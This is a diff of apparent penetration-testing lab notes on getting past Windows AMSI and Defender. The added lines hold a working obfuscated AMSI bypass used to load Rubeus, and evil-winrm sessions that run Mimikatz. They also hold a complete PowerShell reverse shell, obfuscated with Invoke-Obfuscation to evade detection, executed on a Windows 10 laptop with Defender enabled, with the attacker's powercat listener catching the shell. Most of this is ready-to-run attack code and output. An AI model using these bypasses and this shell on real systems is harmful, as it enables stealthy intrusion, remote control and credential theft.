@@ -73,11 +73,11 @@ Windows Security features
 
 
 ================================================================================================================================================
-Examples of AMSI bypass techniques 
+1. Examples of manual AMSI bypass techniques 
 ================================================================================================================================================
 
-------------------------------------------------------------------------------------------------------------------------------------------------
-Example/Test 1 - Manual AMSI bypass as a low privileged user locally logged on a Windows 10 laptop with Defender (AV) enabled and up-to-date
+
+Test 1 - Manual AMSI bypass as a low privileged user locally logged on a Windows 10 laptop with Defender (AV) enabled and up-to-date
 ------------------------------------------------------------------------------------------------------------------------------------------------
 
 Windows PowerShell
@@ -153,9 +153,52 @@ AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\auditor\AppData\Local\Mic
 PS C:\temp>
 
 
-------------------------------------------------------------------------------------------------------------------------------------------------------------
-Example/Test 2 - AMSI bypass with the tool evil-winrm running with a local admin account on a Windows 2016 server with Defender (AV) enabled and up-to-date
-------------------------------------------------------------------------------------------------------------------------------------------------------------
+Test 2 - Manual AMSI bypass as a local admin user remotely logged on a Window 10 Laptop with Defender (AV) enabled and up-to-date
+------------------------------------------------------------------------------------------------------------------------------------------------
+
+PS C:\> Enter-PSSession -Computername server02.Security-Test-Lab.Local -Credential server02\administrator
+[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> 
+
+=> Note: Without disabling the AMSI, the script 'Invoke-Rubeus.ps1' is detected and blocked by Windows Defender...
+
+[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> . .\Invoke-Rubeus.ps1
+At C:\Users\Administrator.PO718687\Documents\Tools-AD\Invoke-Rubeus.ps1:1 char:1
++ function Invoke-Rubeus([string]$Command)
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+    + CategoryInfo          : ParserError: (:) [], ParseException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
+
+=> Note: Let's disable it.
+
+[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> 
+[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> $Hxl=$null;
+[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> $xqhoooo="$([cHAr](83*54/54)+[CHAR]([bYTe]0x79)+[chaR]([BytE]0x73)+[cHAR]([ByTE]0x74)+[chAR]([BYte]0x65)+[chAr]([BYTE]0x6d)).$(('Mänäg'+'ement').NORmAlize([ChAr](13+57)+[cHAr]([BytE]0x6f)+[CHAR](40+74)+[cHaR](92+17)+[CHAr](68+27-27)) -replace [ChAr]([BYte]0x5c)+[CHar](112)+[chAR]([byte]0x7b)+[chAr](77*64/64)+[ChaR](110)+[char](125*63/63)).$(('Autóm'+'âtíon').nOrmALIZE([char]([BYtE]0x46)+[CHAr]([BYtE]0x6f)+[ChaR](114+1-1)+[ChaR]([ByTe]0x6d)+[chaR](68)) -replace [cHar]([ByTE]0x5c)+[cHAR]([bYTe]0x70)+[cHAR]([byTe]0x7b)+[cHAR]([byte]0x4d)+[CHar](110+94-94)+[cHAR]([BYtE]0x7d)).$([chAR]([bYTE]0x41)+[CHAR]([byTE]0x6d)+[ChAR]([ByTE]0x73)+[chaR](105+6-6)+[ChaR](85+23-23)+[cHAR](116*86/86)+[cHar](105)+[cHar]([BYtE]0x6c)+[cHAr](115))";
+[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> $wpkfsoadsfehqpe="+[cHAR]([bytE]0x72)+[ChAr](121)+[chAR]([bYtE]0x79)+[cHar](97+3)+[cHar](121+41-41)+[cHAr]([bYte]0x6f)+[cHar]([BYTe]0x66)+[chAr](107+87-87)+[chAr]([BYTE]0x69)";
+[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> [Threading.Thread]::Sleep(286);
+[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> [Ref].Assembly.GetType($xqhoooo).GetField($([char](71+26)+[char]([BYtE]0x6d)+[CHar]([byte]0x73)+[chaR](105+75-75)+[CHar]([ByTe]0x49)+[chAr]([bytE]0x6e)+[CHar](37+68)+[cHAr](116+2-2)+[Char](70+37-37)+[char](97)+[chAR]([BYTE]0x69)+[chaR](93+15)+[CHAr]([byte]0x65)+[char](100)),"NonPublic,Static").SetValue($Hxl,$true);
+[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents>
+[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents>  . .\Invoke-Rubeus.ps1
+[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents>  Invoke-Rubeus
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.6.4
+<SNIP>
+
+=> It is working.
+
+
+===================================================================================================================================================
+2. Examples of AMSI bypass using the tool evil-winrm
+===================================================================================================================================================
+
+Test 1 - AMSI bypass with the tool evil-winrm running with a local admin account on a Windows 2016 server with Defender (AV) enabled and up-to-date
+---------------------------------------------------------------------------------------------------------------------------------------------------
 
 $ evil-winrm -u Administrator -p Test1234 -i 192.168.1.38 -s '/home/kali/Documents/'                                    
 
@@ -256,7 +299,6 @@ Warning: AV could be still watching for suspicious activity. Waiting for patchin
 
 [+] Success!
 
-
 *Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Mimikatz.ps1
 *Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Mimikatz
 
@@ -288,52 +330,11 @@ SID               : S-1-5-90-0-1
 
 <SNIP>
 
------------------------------------------------------------------------------------------------------------------------------------------
-Example/Test 3 - Manual AMSI bypass as a local admin user remotely logged on a Window 10 Laptop with Defender (AV) enabled and up-to-date
------------------------------------------------------------------------------------------------------------------------------------------
-
-2.1 Test with Powershell Remoting
-----------------------------------
-
-PS C:\> Enter-PSSession -Computername server02.Security-Test-Lab.Local -Credential server02\administrator
-[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> 
-
-=> Note: Without disabling the AMSI, the script 'Invoke-Rubeus.ps1' is detected and blocked by Windows Defender...
-
-[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> . .\Invoke-Rubeus.ps1
-At C:\Users\Administrator.PO718687\Documents\Tools-AD\Invoke-Rubeus.ps1:1 char:1
-+ function Invoke-Rubeus([string]$Command)
-+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-This script contains malicious content and has been blocked by your antivirus software.
-    + CategoryInfo          : ParserError: (:) [], ParseException
-    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
-
-=> Note: Let's disable it.
-
-[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> 
-[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> $Hxl=$null;
-[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> $xqhoooo="$([cHAr](83*54/54)+[CHAR]([bYTe]0x79)+[chaR]([BytE]0x73)+[cHAR]([ByTE]0x74)+[chAR]([BYte]0x65)+[chAr]([BYTE]0x6d)).$(('Mänäg'+'ement').NORmAlize([ChAr](13+57)+[cHAr]([BytE]0x6f)+[CHAR](40+74)+[cHaR](92+17)+[CHAr](68+27-27)) -replace [ChAr]([BYte]0x5c)+[CHar](112)+[chAR]([byte]0x7b)+[chAr](77*64/64)+[ChaR](110)+[char](125*63/63)).$(('Autóm'+'âtíon').nOrmALIZE([char]([BYtE]0x46)+[CHAr]([BYtE]0x6f)+[ChaR](114+1-1)+[ChaR]([ByTe]0x6d)+[chaR](68)) -replace [cHar]([ByTE]0x5c)+[cHAR]([bYTe]0x70)+[cHAR]([byTe]0x7b)+[cHAR]([byte]0x4d)+[CHar](110+94-94)+[cHAR]([BYtE]0x7d)).$([chAR]([bYTE]0x41)+[CHAR]([byTE]0x6d)+[ChAR]([ByTE]0x73)+[chaR](105+6-6)+[ChaR](85+23-23)+[cHAR](116*86/86)+[cHar](105)+[cHar]([BYtE]0x6c)+[cHAr](115))";
-[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> $wpkfsoadsfehqpe="+[cHAR]([bytE]0x72)+[ChAr](121)+[chAR]([bYtE]0x79)+[cHar](97+3)+[cHar](121+41-41)+[cHAr]([bYte]0x6f)+[cHar]([BYTe]0x66)+[chAr](107+87-87)+[chAr]([BYTE]0x69)";
-[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> [Threading.Thread]::Sleep(286);
-[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> [Ref].Assembly.GetType($xqhoooo).GetField($([char](71+26)+[char]([BYtE]0x6d)+[CHar]([byte]0x73)+[chaR](105+75-75)+[CHar]([ByTe]0x49)+[chAr]([bytE]0x6e)+[CHar](37+68)+[cHAr](116+2-2)+[Char](70+37-37)+[char](97)+[chAR]([BYTE]0x69)+[chaR](93+15)+[CHAr]([byte]0x65)+[char](100)),"NonPublic,Static").SetValue($Hxl,$true);
-[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents>
-[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents>  . .\Invoke-Rubeus.ps1
-[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents>  Invoke-Rubeus
-   ______        _
-  (_____ \      | |
-   _____) )_   _| |__  _____ _   _  ___
-  |  __  /| | | |  _ \| ___ | | | |/___)
-  | |  \ \| |_| | |_) ) ____| |_| |___ |
-  |_|   |_|____/|____/|_____)____/(___/
-
-  v1.6.4
-<SNIP>
-
-=> It is working.
+=> It worked !
 
 
-2.2 Test with Evil-WinRM
-----------------------------
+Test 2 - AMSI bypass with the tool evil-winrm running with a local admin account on a Windows 10 laptop with Defender (AV) enabled and up-to-date
+-------------------------------------------------------------------------------------------------------------------------------------------------
 
 ┌──(kali㉿kali)-[~/Documents]
 └─$ evil-winrm -u administrator -p 'Password123!' -i 192.168.1.35 -s '/home/kali/Documents/' -e '/home/kali/Documents/x64/'
@@ -416,9 +417,224 @@ Affected items:
 	amsi: \Device\HarddiskVolume3\Windows\System32\wsmprovhost.exe
 
 
--------------------------------------------------------------------------------------------------------------------------
-Example/Test 4 - Living of the land on a Window server 2012 R2 with a basic AV installed and no AMSI
--------------------------------------------------------------------------------------------------------------------------
+===================================================================================================================================================
+3. Example of AMSI and AV bypass using the tool Invoke-Obfuscation
+===================================================================================================================================================
+
+=> URL: https://github.com/danielbohannon/Invoke-Obfuscation
+
+PS C:\Users\Administrator\Documents\Tools-AD\Invoke-Obfuscation-master> powershell -exec bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\Users\Administrator.PO718687\Documents\Tools-AD\Invoke-Obfuscation-master> Import-Module .\Invoke-Obfuscation.psd1
+
+PS C:\Users\Administrator.PO718687\Documents\Tools-AD\Invoke-Obfuscation-master> Invoke-obfuscation
+
+IEX( ( '36{78Q55@32t61_91{99@104X97{114Q91-32t93}32t93}32t34@110m111@105}115X115-101m114_112@120@69-45{101@107X111m118m110-73Q124Q32X41Q57@51-93Q114_97_104t67t91{44V39Q112_81t109@39}101{99@97}108{112}101}82_45m32_32X52{51Q93m114@97-104{67t91t44t39V98t103V48t39-101}99}97V108}112t101_82_45{32@41X39{41_112t81_109_39m43{39-110t101@112{81t39X43@39t109_43t112_81Q109t101X39Q43m39}114Q71_112{81m109m39@43X39V32Q40}32m39_43_39{114-111m108t111t67{100m110{117Q39_43m39-111-114Q103_101t114@39m43-39{111t70-45}32m41}98{103V48V110Q98t103{48@39{43{39-43{32t98m103_48{111@105t98@103V48-39@43{39_32-32V43V32}32t98t103@48X116m97V99t98X103t48_39V43m39@43-39X43Q39_98@103@48}115V117V102Q98V79m45@98m39Q43{39X103_39X43Q39V48}43-39}43t39}98-103{48V101_107Q39t43X39_111X118X110V39X43}39t98_103{48@43}32_98{103}48{73{98-39@43t39m103_39}43{39{48Q32t39X43X39-32{40V32t41{39Q43V39m98X103{39_43V39{48-116{115Q79{39_43_39}98}103m48{39Q43t39X32X43{32_98@103-39@43m39X48_72-39_43t39V45m39t43Q39_101Q98}103_48-32_39Q43V39V32t39V43}39m43Q32V98X39Q43_39@103_48V39@43Q39@116X73t82V119m98-39{43_39}103Q48X40_46_32m39}40_40{34t59m91@65V114V114@97_121}93Q58Q58V82Q101Q118Q101{114}115_101m40_36_78m55@32t41t32-59{32}73{69V88m32{40t36V78t55}45Q74m111@105-110m32X39V39-32}41'.SpLiT( '{_Q-@t}mXV' ) |ForEach-Object { ([Int]$_ -AS [Char]) } ) -Join'' )
+  |    |    |    |
+  |    |    |    |
+ \ /  \ /  \ /  \ /
+  V    V    V    V
+$N7 =[char[ ] ] "noisserpxE-ekovnI| )93]rahC[,'pQm'ecalpeR-  43]rahC[,'bg0'ecalpeR- )')pQm'+'nepQ'+'m+pQme'+'rGpQm'+' ( '+'roloCdnu'+'orger'+'oF- )bg0nbg0'+'+ bg0oibg0'+'  +  bg0tacbg0'+'+'+'bg0sufbO-b'+'g'+'0+'+'bg0ek'+'ovn'+'bg0+ bg0Ib'+'g'+'0 '+' ( )'+'bg'+'0tsO'+'bg0'+' + bg'+'0H'+'-'+'ebg0 '+' '+'+ b'+'g0'+'tIRwb'+'g0(. '((";[Array]::Reverse($N7 ) ; IEX ($N7-Join '' )
+  |    |    |
+  |    |    |
+ \ /  \ /  \ /
+  V    V    V
+.("wRIt" +  "e-H" + "Ost") (  "I" +"nvoke"+"-Obfus"+"cat"  +  "io" +"n") -ForegroundColor ( 'Gre'+'en')
+  |    |
+  |    |
+ \ /  \ /
+  V    V
+Write-Host "Invoke-Obfuscation" -ForegroundColor Green
+  |
+  |
+ \ /
+  V
+Invoke-Obfuscation
+            ____                 __
+           /  _/___ _   ______  / /_____
+           / // __ \ | / / __ \/ //_/ _ \______
+         _/ // / / / |/ / /_/ / ,< /  __/_____/
+        /______ /__|_________/_/|_|\___/         __  _
+          / __ \/ /_  / __/_  ________________ _/ /_(_)___  ____
+         / / / / __ \/ /_/ / / / ___/ ___/ __ `/ __/ / __ \/ __ \
+        / /_/ / /_/ / __/ /_/ (__  ) /__/ /_/ / /_/ / /_/ / / / /
+        \____/_.___/_/  \__,_/____/\___/\__,_/\__/_/\____/_/ /_/
+
+        Tool    :: Invoke-Obfuscation
+        Author  :: Daniel Bohannon (DBO)
+        Twitter :: @danielhbohannon
+        Blog    :: http://danielbohannon.com
+        Github  :: https://github.com/danielbohannon/Invoke-Obfuscation
+        Version :: 1.8
+        License :: Apache License, Version 2.0
+        Notes   :: If(!$Caffeinated) {Exit}
+
+HELP MENU :: Available options shown below:
+
+[*]  Tutorial of how to use this tool             TUTORIAL
+[*]  Show this Help Menu                          HELP,GET-HELP,?,-?,/?,MENU
+[*]  Show options for payload to obfuscate        SHOW OPTIONS,SHOW,OPTIONS
+[*]  Clear screen                                 CLEAR,CLEAR-HOST,CLS
+[*]  Execute ObfuscatedCommand locally            EXEC,EXECUTE,TEST,RUN
+[*]  Copy ObfuscatedCommand to clipboard          COPY,CLIP,CLIPBOARD
+[*]  Write ObfuscatedCommand Out to disk          OUT
+[*]  Reset ALL obfuscation for ObfuscatedCommand  RESET
+[*]  Undo LAST obfuscation for ObfuscatedCommand  UNDO
+[*]  Go Back to previous obfuscation menu         BACK,CD ..
+[*]  Quit Invoke-Obfuscation                      QUIT,EXIT
+[*]  Return to Home Menu                          HOME,MAIN
+
+
+Choose one of the below options:
+
+[*] TOKEN       Obfuscate PowerShell command Tokens
+[*] AST         Obfuscate PowerShell Ast nodes (PS3.0+)
+[*] STRING      Obfuscate entire command as a String
+[*] ENCODING    Obfuscate entire command via Encoding
+[*] COMPRESS    Convert entire command to one-liner and Compress
+[*] LAUNCHER    Obfuscate command args w/Launcher techniques (run once at end)
+
+
+Invoke-Obfuscation>
+
+Invoke-Obfuscation> set scriptblock & {$ps=$false;$hostip='192.168.1.35';$port=80;$client = New-Object System.Net.Sockets.TCPClient($hostip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..50000|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split();$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd','ls','ps','rm','cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data + $sendback + $prompt + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}
+
+Successfully set ScriptBlock:
+& {$ps=$false;$hostip='192.168.1.35';$port=80;$client = New-Object System.Net.Sockets.TCPClient($hostip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..50000|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split();$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd','ls','ps','rm','cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data + $sendback + $prompt + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}
+
+Invoke-Obfuscation> STRING
+
+Choose one of the below String options to APPLY to current payload:
+
+[*] STRING\1    Concatenate entire command
+[*] STRING\2    Reorder entire command after concatenating
+[*] STRING\3    Reverse entire command after concatenating
+
+Invoke-Obfuscation\String> 2
+
+Executed:
+  CLI:  String\2
+  FULL: Out-ObfuscatedStringCommand -ScriptBlock $ScriptBlock 2
+
+Result:
+&((Gv '*MDr*').NAme[3,11,2]-jOIN'')( ((("{23}{5}{14}{18}{31}{3}{9}{4}{7}{19}{28}{13}{29}{12}{22}{35}{32}{2}{0}{33}{11}{21}{30}{8}{15}{20}{16}{26}{34}{25}{1}{24}{17}{27}{6}{10}" -f 'nd (SfLps -','endback + SfLprompt + 4rT> 4rT;SfL','Litem -eq 4rTSfLps4rT) -a','m.Net.Sockets.TC','tip,SfLport);Sf','Lps=SfLfalse;SfLhostip=4rT192.','stream.Write(SfLsen','Lstream = SfLclient',' SfLmyArra','PClient(SfLhos','dbyte,0,SfLsendbyte.Length);SfLstream.Flush()};SfLclient.Close()}','wd4rT,4rTls4rT,4rTps4rT,4rTrm4rT,4r','SfLd','003mA%{0};while((SfLi = SfLstream.Read(SfLbytes, 0, SfLbytes.Length)) ','168.1.354rT;S','y){if(SfLitem -eq SfLi){SfLdo=SfLtrue}}if(SfLdo -or SfLps){SfLsendback=(','+','dbyte = ([text.encoding]::ASCII).GetBytes(SfLsendbac','fLport=80;SfLclient = New-Object Sys','.GetStream();[',' iex SfLdata 2>&1 3mAOut-String)}else{SfLdata2=4rT/c 4rT','Tcp4rT,4rTmv4rT,4rTcat4r','ata = (New-Object -TypeName System.Text.ASCIIEncoding).GetString','& {Sf','sen',' = SfLdata + SfLs','SfLdata;SfLsendback = ( &SfLcmd SfLdata2 2>&1 3mA Out-String)};if(SfLps){SfLprompt=4','k2);SfL','byte[]]SfLbytes = 0..500','-ne 0){','T);SfLdo=SfLfalse;foreach (SfLi in','te','LinArray[0];if((Sf','eq SfLfalse)){SfLps=SfLtrue}if(SfLitem -like 4rT?:4rT){SfLitem=4rTd:4rT}SfLmyArray=@(4rTcd4rT,4rTexit4rT,4rTd:4rT,4rTp','rTPS 4rT + (pwd).Path}else{SfLprompt=(pwd).Path}SfLsendback2','(SfLbytes,0, SfLi);SfLcmd=(get-childitem Env:ComSpec).value;SfLinArray=SfLdata.split();SfLitem=Sf')) -crEpLACE  ([cHaR]52+[cHaR]114+[cHaR]84),[cHaR]39  -rePLACE 'SfL',[cHaR]36  -crEpLACE'3mA',[cHaR]124) )
+
+Choose one of the below String options to APPLY to current payload:
+
+[*] STRING\1    Concatenate entire command
+[*] STRING\2    Reorder entire command after concatenating
+[*] STRING\3    Reverse entire command after concatenating
+
+Invoke-Obfuscation\String> BACK
+
+Choose one of the below options:
+
+[*] TOKEN       Obfuscate PowerShell command Tokens
+[*] AST         Obfuscate PowerShell Ast nodes (PS3.0+)
+[*] STRING      Obfuscate entire command as a String
+[*] ENCODING    Obfuscate entire command via Encoding
+[*] COMPRESS    Convert entire command to one-liner and Compress
+[*] LAUNCHER    Obfuscate command args w/Launcher techniques (run once at end)
+
+
+Invoke-Obfuscation> UNDO
+
+Successfully removed last obfuscation from ObfuscatedCommand.
+
+Choose one of the below options:
+
+[*] TOKEN       Obfuscate PowerShell command Tokens
+[*] AST         Obfuscate PowerShell Ast nodes (PS3.0+)
+[*] STRING      Obfuscate entire command as a String
+[*] ENCODING    Obfuscate entire command via Encoding
+[*] COMPRESS    Convert entire command to one-liner and Compress
+[*] LAUNCHER    Obfuscate command args w/Launcher techniques (run once at end)
+
+Invoke-Obfuscation>
+
+
+=> Now on our target Windows 10 laptop (with Defender updated and enabled) we run our obfuscated reverse shell
+--------------------------------------------------------------------------------------------------------------
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+PS C:\Users\auditor\>
+PS C:\Users\auditor\>&((Gv '*MDr*').NAme[3,11,2]-jOIN'')( ((("{23}{5}{14}{18}{31}{3}{9}{4}{7}{19}{28}{13}{29}{12}{22}{35}{32}{2}{0}{33}{11}{21}{30}{8}{15}{20}{16}{26}{34}{25}{1}{24}{17}{27}{6}{10}" -f 'nd (SfLps -','endback + SfLprompt + 4rT> 4rT;SfL','Litem -eq 4rTSfLps4rT) -a','m.Net.Sockets.TC','tip,SfLport);Sf','Lps=SfLfalse;SfLhostip=4rT192.','stream.Write(SfLsen','Lstream = SfLclient',' SfLmyArra','PClient(SfLhos','dbyte,0,SfLsendbyte.Length);SfLstream.Flush()};SfLclient.Close()}','wd4rT,4rTls4rT,4rTps4rT,4rTrm4rT,4r','SfLd','003mA%{0};while((SfLi = SfLstream.Read(SfLbytes, 0, SfLbytes.Length)) ','168.1.354rT;S','y){if(SfLitem -eq SfLi){SfLdo=SfLtrue}}if(SfLdo -or SfLps){SfLsendback=(','+','dbyte = ([text.encoding]::ASCII).GetBytes(SfLsendbac','fLport=80;SfLclient = New-Object Sys','.GetStream();[',' iex SfLdata 2>&1 3mAOut-String)}else{SfLdata2=4rT/c 4rT','Tcp4rT,4rTmv4rT,4rTcat4r','ata = (New-Object -TypeName System.Text.ASCIIEncoding).GetString','& {Sf','sen',' = SfLdata + SfLs','SfLdata;SfLsendback = ( &SfLcmd SfLdata2 2>&1 3mA Out-String)};if(SfLps){SfLprompt=4','k2);SfL','byte[]]SfLbytes = 0..500','-ne 0){','T);SfLdo=SfLfalse;foreach (SfLi in','te','LinArray[0];if((Sf','eq SfLfalse)){SfLps=SfLtrue}if(SfLitem -like 4rT?:4rT){SfLitem=4rTd:4rT}SfLmyArray=@(4rTcd4rT,4rTexit4rT,4rTd:4rT,4rTp','rTPS 4rT + (pwd).Path}else{SfLprompt=(pwd).Path}SfLsendback2','(SfLbytes,0, SfLi);SfLcmd=(get-childitem Env:ComSpec).value;SfLinArray=SfLdata.split();SfLitem=Sf')) -crEpLACE  ([cHaR]52+[cHaR]114+[cHaR]84),[cHaR]39  -rePLACE 'SfL',[cHaR]36  -crEpLACE'3mA',[cHaR]124) )
+
+
+=> On our attacker machine
+--------------------------------------------------------------------------------------------------------------
+PS C:\Users\Administrator\Documents\Tools-AD> . .\powercat.ps1
+PS C:\Users\Administrator\Documents\Tools-AD> powercat -l -v -p 80 -t 1000
+VERBOSE: Set Stream 1: TCP
+VERBOSE: Set Stream 2: Console
+VERBOSE: Setting up Stream 1...
+VERBOSE: Listening on [0.0.0.0] (port 80)
+VERBOSE: Connection from [192.168.1.4] port  [tcp] accepted (source port 63172)
+VERBOSE: Setting up Stream 2...
+VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...
+
+whoami
+laptopwin10\auditor
+
+C:\Users\auditor> 
+				       
+C:\Users\auditor> powershell -c "Get-MpComputerStatus"
+powershell -c "Get-MpComputerStatus"
+
+AMEngineVersion                  : 1.1.18800.4
+AMProductVersion                 : 4.18.2111.5
+AMRunningMode                    : Normal
+AMServiceEnabled                 : True
+AMServiceVersion                 : 4.18.2111.5
+AntispywareEnabled               : True
+AntispywareSignatureAge          : 0
+AntispywareSignatureLastUpdated  : 12/18/2021 5:12:28 PM
+AntispywareSignatureVersion      : 1.355.494.0
+AntivirusEnabled                 : True
+AntivirusSignatureAge            : 0
+AntivirusSignatureLastUpdated    : 12/18/2021 5:12:29 PM
+AntivirusSignatureVersion        : 1.355.494.0
+BehaviorMonitorEnabled           : True
+ComputerID                       : 5922E6F6-84FC-4B59-BC28-F5F8F52848D0
+ComputerState                    : 0
+DeviceControlDefaultEnforcement  : N/A
+DeviceControlPoliciesLastUpdated : 12/19/2021 9:16:01 AM
+DeviceControlState               : N/A
+FullScanAge                      : 4294967295
+FullScanEndTime                  :
+FullScanStartTime                :
+IoavProtectionEnabled            : True
+IsTamperProtected                : True
+IsVirtualMachine                 : False
+LastFullScanSource               : 0
+LastQuickScanSource              : 2
+NISEnabled                       : True
+NISEngineVersion                 : 1.1.18800.4
+NISSignatureAge                  : 0
+NISSignatureLastUpdated          : 12/18/2021 5:12:29 PM
+NISSignatureVersion              : 1.355.494.0
+OnAccessProtectionEnabled        : True
+QuickScanAge                     : 0
+QuickScanEndTime                 : 12/19/2021 9:03:45 AM
+QuickScanStartTime               : 12/19/2021 9:02:25 AM
+RealTimeProtectionEnabled        : True
+RealTimeScanDirection            : 0
+TamperProtectionSource           : Signatures
+TDTMode                          : N/A
+TDTStatus                        : N/A
+TDTTelemetry                     : N/A
+PSComputerName                   :
+
+C:\Users\auditor> exit
+VERBOSE: Failed to redirect data from Stream 1 to Stream 2
+
+
+===================================================================================================================================================
+5. Example of Living of the land on a Window server 2012 R2 with a basic AV installed and no AMSI
+===================================================================================================================================================
 
 Note:  Just for testing purposes, I installed the old and basic AV 'Microsoft Security Essentials' in compatibility mode on a Windows server 2012 R2.
        As expected, there is no AMSI and the basic AV (even with an updated signature database) does't not detect and nor block the PowerShell scripts
